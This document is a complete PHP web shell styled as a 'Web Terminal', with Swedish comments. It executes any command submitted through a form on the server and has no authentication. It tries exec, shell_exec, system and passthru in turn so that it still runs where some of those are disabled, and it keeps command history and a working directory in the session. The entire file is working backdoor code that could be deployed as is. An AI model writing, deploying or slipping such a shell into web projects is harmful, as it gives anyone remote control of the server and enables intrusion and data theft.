<?php
session_start();

// Sätt användare och host
$username = get_current_user();
$hostname = gethostname();

// Initiera session för historik och cwd
if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();

// Funktion för att köra kommandon på flera sätt
function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $out);
        $output = implode("\n", $out);
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $output = ob_get_clean();
    }
    return $output;
}

// Hantera POST (nytt kommando)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = trim($_POST['command']);
    $cwd = $_SESSION['cwd'];
    $output = '';
    // clear
    if ($command === 'clear') {
        $_SESSION['history'] = [];
    } elseif (preg_match('/^cd(\s+(.+))?$/', $command, $m)) {
        // cd eller cd path
        $path = isset($m[2]) ? $m[2] : getenv('HOME');
        $newCwd = $cwd;
        if ($path === '' || $path === '~') {
            $newCwd = getenv('HOME') ?: $cwd;
        } elseif ($path[0] === '/') {
            $newCwd = $path;
        } else {
            $newCwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $path;
        }
        if (@chdir($newCwd)) {
            $_SESSION['cwd'] = getcwd();
            $output = '';
        } else {
            $output = "cd: $path: No such directory";
        }
    } elseif ($command !== '') {
        chdir($cwd);
        $output = executeCommand($command);
    }
    if ($command !== '') {
        $_SESSION['history'][] = [
            'cmd' => $command,
            'out' => $output,
            'cwd' => $_SESSION['cwd']
        ];
    }
}

$currentCwd = $_SESSION['cwd'];
?>
<html>
<head>
    <title>Web Terminal</title>
    <style>
        body { background: #222; color: #eee; font-family: monospace; }
        .terminal { background: #111; padding: 20px; border-radius: 8px; width: 700px; margin: 40px auto; box-shadow: 0 0 10px #000; }
        .output { min-height: 200px; max-height: 400px; overflow-y: auto; margin-bottom: 10px; }
        .prompt { color: #0f0; font-weight: bold; }
        .cwd { color: #1BC9E7; }
        input[type=text] { background: #222; color: #eee; border: none; width: 90%; font-size: 1em; padding: 5px; }
        input[type=submit] { display: none; }
        .cmdline { display: flex; align-items: center; }
    </style>
    <script>
    window.onload = function() {
        var cmd = document.getElementById('command');
        cmd.focus();
        cmd.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                document.getElementById('shellform').submit();
            }
            // Enkel historik med piltangenter
            if (e.key === 'ArrowUp' || e.key === 'ArrowDown') {
                let hist = <?php echo json_encode(array_column($_SESSION['history'], 'cmd')); ?>;
                if (!window.histPos) window.histPos = hist.length;
                if (e.key === 'ArrowUp' && window.histPos > 0) {
                    window.histPos--;
                    cmd.value = hist[window.histPos] || '';
                }
                if (e.key === 'ArrowDown' && window.histPos < hist.length-1) {
                    window.histPos++;
                    cmd.value = hist[window.histPos] || '';
                } else if (e.key === 'ArrowDown' && window.histPos === hist.length-1) {
                    window.histPos++;
                    cmd.value = '';
                }
            }
        });
        var out = document.getElementById('output');
        out.scrollTop = out.scrollHeight;
    };
    </script>
</head>
<body>
<div class="terminal">
    <div class="output" id="output">
        <?php
        foreach ($_SESSION['history'] as $entry) {
            $prompt = sprintf('<span class="prompt">%s@%s:<span class="cwd">%s</span>$</span>',
                htmlspecialchars($username), htmlspecialchars($hostname), htmlspecialchars($entry['cwd']));
            echo $prompt . ' ' . htmlspecialchars($entry['cmd']) . "<br>";
            if (trim($entry['out']) !== '') {
                echo '<pre>' . htmlspecialchars($entry['out']) . "</pre>";
            }
        }
        ?>
    </div>
    <form method="post" id="shellform" autocomplete="off">
        <div class="cmdline">
            <span class="prompt"><?php echo htmlspecialchars($username) . '@' . htmlspecialchars($hostname) . ':<span class=\'cwd\'>' . htmlspecialchars($currentCwd) . '</span>$'; ?></span>
            <input type="text" name="command" id="command" placeholder="Enter command" autofocus autocomplete="off">
            <input type="submit" value="Execute">
        </div>
    </form>
</div>
</body>
</html>


